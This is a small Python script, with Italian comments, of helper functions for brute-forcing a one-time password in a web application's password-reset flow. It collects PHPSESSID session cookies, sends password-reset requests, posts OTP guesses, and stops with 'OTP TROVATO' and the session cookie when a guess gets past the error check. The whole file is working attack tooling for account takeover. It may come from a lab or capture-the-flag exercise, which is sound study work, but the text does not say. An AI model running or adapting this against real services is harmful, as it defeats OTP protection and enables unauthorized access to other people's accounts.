import requests

def getCookie(http_req_index):
    #Aggiungere Headers
    response = requests.get(url=http_req_index["url"], data=http_req_index["data"])
    #print(response.cookies.get_dict()['PHPSESSID'])
    return response.cookies.get_dict()['PHPSESSID']

def do_request(http_req_pwRst, flag = None):
    if(not flag):
        response = requests.get(url=http_req_pwRst['url'], headers=http_req_pwRst['headers'])
        return response.cookies.get_dict()['PHPSESSID']
    elif(flag == "pw"):
        #print("SEND PW RST")
        response = requests.post(url=http_req_pwRst['url'], data=http_req_pwRst['data'], headers=http_req_pwRst['headers'])
    else:
        pass

def bruteOTP(http_req_otp, error, cookie):
    response = requests.post(url=http_req_otp['url'], data=http_req_otp['data'], headers=http_req_otp['headers'])
    if( not error in response.text):
        exit(f"\nOTP TROVATO: {http_req_otp['data']} \n Cookie: {cookie}")

def logout(logout_req):
    response = requests.get(url=logout_req['url'], headers=logout_req['headers'])
